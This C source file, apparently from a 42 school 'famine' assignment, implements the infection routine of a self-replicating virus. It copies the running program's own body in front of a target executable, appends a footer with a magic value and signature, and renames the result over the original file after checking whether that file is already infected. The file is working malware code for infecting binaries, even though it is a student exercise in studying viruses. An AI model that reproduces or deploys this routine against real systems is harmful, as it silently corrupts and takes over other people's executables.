/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infect.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/03/04 11:29:15 by mbatty            #+#    #+#             */
/*   Updated: 2026/04/14 18:22:35 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>

#define DIRENT_DIRECTORY 4

int		check_signature(t_ctx *ctx, const char *path);
char	*strjoin(char const *s1, char const *s2);

uint64_t	min(uint64_t a, uint64_t b)
{
	return (a < b ? a : b);
}

void	pack(t_ctx *ctx, const char *bin1_path, const char *bin2_path, const char *resbin_path)
{
	int	bin1_fd = open(bin1_path, O_RDONLY);
	int	bin2_fd = open(bin2_path, O_RDONLY);
	int	resbin_fd = open(resbin_path, O_WRONLY | O_CREAT | O_TRUNC, 0777);

	struct stat	stats;

	char	buf[4096];
	ssize_t	size;

	fstat(bin1_fd, &stats);

	ssize_t	bin1_size_to_write = stats.st_size - (ctx->payload_size + sizeof(t_footer));

	do {
		size = read(bin1_fd, buf, min(bin1_size_to_write, sizeof(buf)));
		bin1_size_to_write -= size;
		write(resbin_fd, buf, size);
	} while (size != -1 && size != 0);

	do {
		size = read(bin2_fd, buf, sizeof(buf));
		write(resbin_fd, buf, size);
	} while (size != -1 && size != 0);

	fstat(bin2_fd, &stats);

	t_footer	footer = {
		.magic = FOOTER_MAGIC,
		.payload_size = stats.st_size,
		.signature = SIGNATURE_STR,
	};

	write(resbin_fd, &footer, sizeof(t_footer));

	close(bin1_fd);
	close(bin2_fd);
	close(resbin_fd);
}

int	infect_file(t_ctx *ctx, const char *path)
{
	if (check_signature(ctx, path) == -1)
		return (-1);

	int	fd = open(path, O_WRONLY | O_APPEND);
	if (fd == -1)
		return (-1);

	char	*tmp_path = strjoin(path, ".tmp");

	pack(ctx, ctx->exec_path, path, tmp_path);
	rename(tmp_path, path);

	free(tmp_path);

	close(fd);
	return (0);
}
